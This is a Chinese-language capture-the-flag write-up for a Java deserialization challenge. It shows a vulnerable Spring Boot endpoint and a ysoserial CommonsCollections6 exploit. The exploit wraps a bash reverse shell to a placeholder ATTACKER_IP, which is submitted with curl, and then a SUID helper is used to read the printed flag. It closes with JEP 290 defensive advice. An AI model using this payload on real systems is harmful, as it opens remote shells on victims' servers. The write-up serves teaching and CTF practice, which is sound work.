# WhySoSerial

## 题目简述

题目是一个 Spring Boot 服务，接收 Base64 字符串并直接用 `ObjectInputStream.readObject()` 反序列化。程序同时打包了存在已知利用链的 `commons-collections:3.2.1`，因此可以构造 CommonsCollections6 gadget，在反序列化阶段执行命令，随后运行 SUID 程序 `/readflag` 读取 flag。

## 解题过程

### 1. 确认反序列化入口

前端向 `/deserialize` 发送表单字段 `data`。反编译 `ChallengeController.class` 后，核心逻辑等价于：

```java
@PostMapping("/deserialize")
@ResponseBody
public String deserialize(String data) {
    if (data.length() > 2000) {
        return "base64 data is too long";
    }

    try {
        byte[] buffer = Base64.getDecoder().decode(data);
        ObjectInputStream input = new ObjectInputStream(
            new ByteArrayInputStream(buffer)
        );
        return input.readObject().toString();
    } catch (Exception e) {
        e.printStackTrace();
        return "deserialize error";
    }
}
```

服务端没有类型白名单或对象过滤器，攻击者能够完全控制传给 `readObject()` 的序列化字节。唯一额外限制是编码后的 Base64 字符串不能超过 2000 字符。

### 2. 选择 CommonsCollections6

JAR 内的 `pom.xml` 明确包含：

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

[ysoserial 官方仓库](https://github.com/frohoff/ysoserial) 收录了针对 Java 反序列化依赖的多条 gadget 链；其中 CommonsCollections6 兼容 Commons Collections 3.x，并且生成的 Base64 载荷能够控制在本题 2000 字符的限制内。

### 3. 生成并提交载荷

`Runtime.exec(String)` 不会自动按 Shell 语法解释重定向和管道，因此先把反向 Shell 命令编码，再用 `bash -c`、Brace Expansion 和 Base64 解码恢复。将下面的 `ATTACKER_IP`、`ATTACKER_PORT` 与 `TARGET` 换成比赛环境中的实际值：

```bash
reverse='bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'
encoded=$(printf '%s' "$reverse" | base64 -w0)

java -jar ysoserial-all.jar CommonsCollections6 \
  "bash -c {echo,$encoded}|{base64,-d}|{bash,-i}" \
  | base64 -w0 > payload.b64

wc -c payload.b64

curl -sS -X POST 'http://TARGET/deserialize' \
  --data-urlencode "data=$(<payload.b64)"
```

这里必须使用 `--data-urlencode`，否则 Base64 中的 `+` 等字符可能在表单解析时被改写。提交前还应确认 `wc -c` 的结果不超过 2000。

先在攻击端监听对应端口。收到 Shell 后运行：

```bash
/readflag
```

Dockerfile 将 `/flag` 权限设为 `400`，同时给 `/readflag` 设置了 SUID 位；因此普通 Web 用户不能直接读取 `/flag`，但可以通过该辅助程序得到：

```text
0xGame{easy_ysoserial_commonscollections_05c68d08abf2}
```

## 方法总结

本题的决定性证据是“攻击者可控的 `ObjectInputStream.readObject()` + classpath 中的 Commons Collections 3.2.1”。利用时还要同时满足 Base64 长度上限和 `Runtime.exec` 的参数解析规则。防御上应避免反序列化不可信 Java 对象；若因兼容性必须保留，应使用 JEP 290 对可反序列化类型、深度、数组大小和字节数设置严格过滤。
